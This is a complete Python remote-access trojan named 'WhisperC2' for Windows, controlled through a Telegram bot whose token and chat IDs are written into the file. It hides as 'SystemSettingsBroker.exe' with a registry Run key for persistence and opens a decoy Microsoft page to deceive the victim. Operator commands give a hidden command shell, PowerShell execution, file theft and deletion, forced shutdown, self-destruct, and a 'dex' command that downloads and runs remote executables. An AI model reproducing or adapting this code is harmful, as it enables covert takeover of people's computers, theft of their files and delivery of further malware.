#!/usr/bin/env python3
# =============================================================================
# WhisperC2 Professional – PID‑Based Override + Auto‑Topic Recreation
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
import shutil, winreg, ctypes, requests
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration – Zubby’s exact details
# -----------------------------------------------------------------------------
BOT_API_KEY = "8229959913:AAFuLnQB33pstSVbc-g0VgkuVFHHhTh4Qac"
OPERATOR_CHAT_ID = 8269558111
GROUP_CHAT_ID = -1003919074770
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Early crash logger
# -----------------------------------------------------------------------------
def crash_log(msg):
    try:
        with open(Path(sys.executable).parent / "whisper_error.log", "a") as f:
            f.write(f"[{datetime.now()}] {msg}\n")
    except:
        pass

# -----------------------------------------------------------------------------
# Thread‑safe log buffer
# -----------------------------------------------------------------------------
log_lock = threading.Lock()
log_lines = []

def log(msg: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        log_lines.append({"time": timestamp, "msg": msg})
    print(f"* {msg}")

# -----------------------------------------------------------------------------
# Telegram bot
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)

# -----------------------------------------------------------------------------
# Agent identity & persistence
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()
HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]

TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
PID_FILE = Path(agents_dir) / "agent.pid"

# -----------------------------------------------------------------------------
# Kill old instance if any
# -----------------------------------------------------------------------------
def kill_old_instance():
    if PID_FILE.exists():
        try:
            old_pid = int(PID_FILE.read_text().strip())
            if old_pid == os.getpid():
                return
            handle = ctypes.windll.kernel32.OpenProcess(0x0001, False, old_pid)
            if handle:
                ctypes.windll.kernel32.TerminateProcess(handle, 0)
                ctypes.windll.kernel32.CloseHandle(handle)
                log(f"Killed old agent (PID {old_pid})")
                time.sleep(0.5)
        except:
            pass
        try:
            PID_FILE.unlink()
        except:
            pass

def save_pid():
    PID_FILE.write_text(str(os.getpid()))

atexit.register(lambda: PID_FILE.unlink(missing_ok=True) if PID_FILE.exists() else None)

# -----------------------------------------------------------------------------
# HTML5 Telemetry
# -----------------------------------------------------------------------------
def generate_telemetry_report(status: str) -> str:
    color = "#4CAF50" if status == "online" else "#F44336"
    emoji = "🟢" if status == "online" else "💀"
    title = f"{SYSTEM_ID} – {status.upper()}"
    rows = ""
    with log_lock:
        for entry in log_lines[-30:]:
            rows += f"<tr><td class=\"timestamp\">{entry['time']}</td><td class=\"message\">{entry['msg']}</td></tr>"
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{title}</title><style>
    *{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:2rem}}.report-card{{max-width:900px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5)}}.header{{background:{color};padding:2rem;text-align:center}}.header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}.header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}table{{width:100%;border-collapse:collapse}}th,td{{padding:.75rem 1rem;border-bottom:1px solid #21262d}}th{{text-align:left;background:#0d1117;color:#8b949e}}tr:hover{{background:#1c2128}}</style></head><body><div class="report-card"><div class="header"><h1>{emoji} {title}</h1><div class="agent">{SYSTEM_ID}</div></div><div class="body" style="padding:1.5rem"><table><thead><tr><th>Timestamp</th><th>Event</th></tr></thead><tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody></table></div></div></body></html>"""

def send_telemetry(topic_id, status: str) -> bool:
    html_content = generate_telemetry_report(status)
    bio = io.BytesIO(html_content.encode('utf-8'))
    bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    if topic_id:
        try:
            bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
            log(f"Telemetry HTML sent to topic ({status})")
            return True
        except:
            pass
    try:
        bot.send_document(GROUP_CHAT_ID, bio)
        log(f"Telemetry HTML sent to group ({status})")
        return True
    except:
        pass
    plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([x['msg'] for x in log_lines[-10:]]) + "\n```"
    try:
        bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
        return True
    except:
        return False

# -----------------------------------------------------------------------------
# Topic management (auto‑recreate if deleted)
# -----------------------------------------------------------------------------
def load_topic_id() -> int | None:
    if TOPIC_ID_FILE.exists():
        try:
            return int(TOPIC_ID_FILE.read_text().strip())
        except:
            pass
    return None

def save_topic_id(tid: int) -> None:
    TOPIC_ID_FILE.write_text(str(tid))

def get_or_create_topic() -> int | None:
    existing = load_topic_id()
    if existing:
        try:
            test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
            bot.delete_message(GROUP_CHAT_ID, test.message_id)
            return existing
        except:
            log("Stored topic not found – will create a new one")
    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        tid = new_topic.message_thread_id
        save_topic_id(tid)
        log(f"Created new topic {tid}")
        return tid
    except Exception as e:
        log(f"Topic creation failed: {e}")
        return None

def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log("Persistence skipped – script mode")
        return False
    try:
        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.resolve() == dest_path.resolve():
            return True
        if not dest_path.exists():
            try:
                shutil.copy2(current, dest_path)
            except PermissionError:
                log("Copy skipped – file exists or locked")
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'System Settings Broker', 0, winreg.REG_SZ, str(dest_path))
        return True
    except Exception as e:
        log(f"Persistence error: {traceback.format_exc()}")
        return False

def self_destruct(topic_id) -> None:
    log("Self‑destruct started")
    send_telemetry(topic_id, "offline")
    try:
        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
        if persistent.exists():
            persistent.unlink()
    except:
        pass
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, 'System Settings Broker')
            except FileNotFoundError:
                pass
    except:
        pass
    try:
        current = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__)
        if current.exists():
            ctypes.windll.kernel32.MoveFileExW(str(current), None, 0x4)
    except:
        pass

# -----------------------------------------------------------------------------
# Interactive shell
# -----------------------------------------------------------------------------
shell_active = False
shell_process = None
_shell_topic_id = None
shell_lock = threading.Lock()

def spawn_shell(topic_id) -> bool:
    global shell_active, shell_process, _shell_topic_id
    with shell_lock:
        if shell_active:
            return True
        _shell_topic_id = topic_id
        try:
            shell_process = subprocess.Popen(
                "cmd.exe",
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=0,
                creationflags=0x08000000
            )
            shell_active = True
            threading.Thread(target=shell_reader, daemon=True).start()
            log("Interactive shell spawned")
            return True
        except Exception as e:
            log(f"Shell spawn failed: {e}")
            return False

def shell_reader() -> None:
    global shell_active
    while shell_active and shell_process and shell_process.stdout:
        if shell_process.poll() is not None:
            break
        try:
            line = shell_process.stdout.readline()
            if not line:
                break
            safe = line.replace('```', "'''")
            for chunk in [safe[i:i+3900] for i in range(0, len(safe), 3900)]:
                try:
                    bot.send_message(GROUP_CHAT_ID,
                                     f"```\n{chunk}\n```",
                                     message_thread_id=_shell_topic_id,
                                     parse_mode='Markdown')
                    time.sleep(0.25)
                except:
                    pass
        except:
            break
    kill_shell()

def kill_shell() -> None:
    global shell_active, shell_process
    shell_active = False
    if shell_process:
        try:
            shell_process.stdin.close()
            shell_process.terminate()
        except:
            pass

def write_shell(cmd: str) -> None:
    if shell_active and shell_process and shell_process.stdin:
        try:
            shell_process.stdin.write(cmd + "\n")
            shell_process.stdin.flush()
        except:
            kill_shell()

# -----------------------------------------------------------------------------
# Command helpers & dispatcher
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    try:
        return subprocess.getstatusoutput(cmd)[1][:4000]
    except Exception as e:
        return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    try:
        return subprocess.getstatusoutput(f"powershell -Command {cmd}")[1][:4000]
    except Exception as e:
        return f"Error: {e}"

def view_file(path: str) -> str:
    try:
        if not os.path.exists(path): return "Not found"
        if os.path.isdir(path): return "Is a directory"
        if os.path.getsize(path) > 10*1024*1024: return "Too large"
        with open(path, 'r', errors='ignore') as f:
            return f.read()[:4000]
    except Exception as e:
        return f"Error: {e}"

def download_file_fs(path: str):
    try:
        if not os.path.exists(path): return None, "Not found"
        if os.path.isdir(path): return None, "Is a directory"
        if os.path.getsize(path) > 50*1024*1024: return None, "Too large"
        return path, None
    except:
        return None, "Error"

def dex(arg_line: str):
    if not arg_line: return "Usage: dex <url> [args...]"
    parts = arg_line.split(maxsplit=1)
    url = parts[0]
    extra = parts[1].split() if len(parts) > 1 else []
    p = urlparse(url)
    if p.scheme not in ('http','https'): return "Invalid scheme"
    ext = os.path.splitext(p.path)[1] or ".exe"
    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + ext
    dest = os.path.join(os.environ.get('TEMP','.'), name)
    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for c in r.iter_content(8192):
                if c: f.write(c)
    except Exception as e:
        return f"Download failed: {e}"
    try:
        proc = subprocess.Popen([dest, *extra],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, creationflags=0x08000000)
        out, err = proc.communicate(timeout=30)
        output = (out + err).strip() or "[No output]"
        return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
    except Exception as e:
        return f"Execution error: {e}"
    finally:
        try: ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
        except: pass

def execute_command(cmd_line: str, topic_id):
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping","start","scan"):
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
    elif cmd == "shell":
        if args: return sys_cmd(args).replace('```',"'''"), None
        return ("💬 Interactive shell started. Type `exit` to close.", None) if spawn_shell(topic_id) else ("❌ Failed to spawn shell.", None)
    elif cmd in ("powershell","pow"):
        if not args: return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```',"'''"), None
    elif cmd in ("download","downloadfile"):
        path, err = download_file_fs(args.strip())
        if err: return err, None
        return f"⬆️ Uploading {args.strip()}", path
    elif cmd == "delete":
        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e: return f"❌ Delete failed: {e}", None
    elif cmd in ("view","viewfile"): return view_file(args.strip()).replace('```',"'''"), None
    elif cmd == "dex": return dex(args).replace('```',"'''"), None
    elif cmd == "die":
        self_destruct(topic_id)
        return "💀 Shutting down...", None
    elif cmd == "off":
        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
        return "🔌 Shutting down PC...", None
    else:
        return f"❓ Unknown: {cmd}", None

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():
    try:
        bot.send_message(GROUP_CHAT_ID, f"⚡ **{SYSTEM_ID}** is starting…")
        log("Startup ping sent")
        kill_old_instance()
        save_pid()
        install_persistence()
        log("Persistence done")
        topic_id = None
        for _ in range(3):
            topic_id = get_or_create_topic()
            if topic_id: break
            time.sleep(2)
        if not topic_id:
            log("Could not create forum topic – falling back to main group")
            topic_id = None
            bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
        log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
        def _handler_wrapper(message):
            if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
                return
            if topic_id is not None:
                if getattr(message, 'message_thread_id', None) != topic_id:
                    return
            else:
                if not message.text or HOSTNAME_PREFIX not in message.text:
                    return
            text = (message.text or "").strip()
            if not text: return
            if shell_active:
                clean = text[1:] if text.startswith('/') else text
                if clean.lower() == "exit":
                    kill_shell()
                    bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=topic_id)
                elif clean.lower().startswith("die"):
                    kill_shell()
                    execute_command("die", topic_id)
                else:
                    write_shell(clean)
                return
            if text.startswith('/'): text = text[1:]
            response, file_path = execute_command(text, topic_id)
            reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
            if text.lower().startswith("die"):
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
                sys.exit(0)
            try:
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
            except:
                bot.reply_to(message, response, **reply_kwargs)
            if file_path and os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        bot.send_document(message.chat.id, f, message_thread_id=topic_id)
                except Exception as e:
                    log(f"File send error: {e}")
                finally:
                    try: os.remove(file_path)
                    except: pass
        @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
        def _handler(msg):
            _handler_wrapper(msg)
        threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
        send_telemetry(topic_id, "online")
        log("Polling…")
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except Exception as fatal:
        crash_log(f"Fatal error: {traceback.format_exc()}")
        try:
            bot.send_message(GROUP_CHAT_ID, f"🔥 **{SYSTEM_ID}** crashed on startup: {fatal}")
        except:
            pass

if __name__ == "__main__":
    main()
